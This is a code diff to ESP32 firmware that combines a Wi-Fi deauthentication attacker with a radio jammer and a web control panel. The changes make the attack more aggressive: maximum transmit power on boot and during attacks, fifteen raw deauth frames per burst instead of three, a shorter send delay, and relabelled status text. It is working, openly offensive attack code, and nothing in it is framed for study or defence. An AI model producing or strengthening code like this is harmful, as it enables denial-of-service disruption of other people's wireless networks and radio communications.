@@ -56,7 +56,6 @@ WiFiNetwork scannedNetworks[20];
 uint16_t seqNum = 0;
 
 // ================= FORWARD DECLARATIONS =================
-// CRITICAL: Compiler ko batana padta hai ki ye functions baad mein define honge
 void stopDeauth();
 void startJamming();
 void stopJamming();
@@ -86,7 +85,7 @@ void toggleJammerPhysical() {
   isJamming = !isJamming;
   isWebRfJamming = false; 
   if (isJamming) { 
-      if(isDeauthing) stopDeauth(); // Ab ye error nahi dega
+      if(isDeauthing) stopDeauth();
       startJamming(); 
   } else { 
       stopJamming(); 
@@ -131,11 +130,15 @@ void startDeauth(int index) {
   
   // CRITICAL: Promiscuous mode MUST be enabled for raw frame injection
   esp_wifi_set_promiscuous(true);
+  
+  // 🔥 AGGRESSIVE: Set WiFi TX Power to MAX (84 = 20dBm)
+  esp_wifi_set_max_tx_power(84);
+  
   WiFi.mode(WIFI_AP_STA); delay(100);
   esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
   seqNum = 0;
   
-  Serial.printf("[*] Deauth Started on '%s' (Channel: %d)\n", targetSSID.c_str(), targetChannel);
+  Serial.printf("[*] MAX AGGRESSIVE Deauth Started on '%s' (Channel: %d)\n", targetSSID.c_str(), targetChannel);
   digitalWrite(deauthLedPin, HIGH); isDeauthing = true;
 }
 
@@ -149,8 +152,8 @@ void sendDeauth() {
   packet[23] = (seqNum >> 8) & 0xFF;
   seqNum++;
 
-  // Send 3 times for reliability
-  for (int i = 0; i < 3; i++) {
+  // 🔥 MAXIMUM AGGRESSIVE MODE: 15 packets back-to-back (Pehle 3 tha, ab 15 hai)
+  for (int i = 0; i < 15; i++) {
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
   }
 }
@@ -158,7 +161,7 @@ void sendDeauth() {
 void stopDeauth() { 
   isDeauthing = false; 
   targetSSID = ""; 
-  esp_wifi_set_promiscuous(false); // Turn off promiscuous mode when stopping
+  esp_wifi_set_promiscuous(false);
   digitalWrite(deauthLedPin, LOW); 
   Serial.println("[*] Deauth Stopped!");
 }
@@ -189,7 +192,7 @@ void handleRoot() {
     statusColor = "#ffaa00";
     statusDetails = "<p style='color:#fff; margin-top:5px;'>WiFi Radio disabled. Press GPIO 4 to stop.</p>";
   } else if (isDeauthing) { 
-    statusText = "DEAUTH ATTACK IN PROGRESS";
+    statusText = "MAX AGGRESSIVE DEAUTH ACTIVE";
     statusColor = "#ff0000";
     char bssidStr[18];
     sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
@@ -198,7 +201,7 @@ void handleRoot() {
     statusDetails += "<p style='color:#aaa; font-size:13px;'>BSSID: " + String(bssidStr) + "</p></div>";
   }
 
-  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><meta http-equiv='refresh' content='3'>";
+  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><meta http-equiv='refresh' content='2'>";
   html += "<style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;text-align:center;padding:15px;}";
   html += "h1{color:#ff3333;text-shadow:0 0 10px #ff0000;} .status-box{background:#1a1a1a; border:2px solid " + statusColor + "; padding:20px; border-radius:10px; margin-bottom:20px;}";
   html += ".status-title{font-size:1.5em; color:" + statusColor + "; font-weight:bold;} .btn{display:inline-block;width:42%;margin:4px;padding:12px;font-size:15px;color:#fff;background:#222;border:2px solid #00ff00;text-decoration:none;border-radius:8px;}";
@@ -238,6 +241,9 @@ void setup() {
   pinMode(rfButtonPin, INPUT_PULLUP); pinMode(rfLedPin, OUTPUT); digitalWrite(rfLedPin, LOW);
   pinMode(deauthButtonPin, INPUT_PULLUP); pinMode(deauthLedPin, OUTPUT); digitalWrite(deauthLedPin, LOW);
 
+  // 🔥 AGGRESSIVE: Set global max TX power on boot
+  esp_wifi_set_max_tx_power(84); 
+
   initHP(); initSP(); radio.powerDown(); radio1.powerDown();
   
   WiFi.mode(WIFI_AP_STA);
@@ -263,6 +269,12 @@ void loop() {
   }
 
   if (isJamming) aggressiveRandomMode();
-  if (isDeauthing) { sendDeauth(); delay(20); }
+  
+  // 🔥 MAX SPEED DEAUTH: 5ms delay (20ms se bahut tez, par WDT crash se bachata hai)
+  if (isDeauthing) { 
+    sendDeauth(); 
+    delay(5); 
+  }
+  
   yield(); 
 }
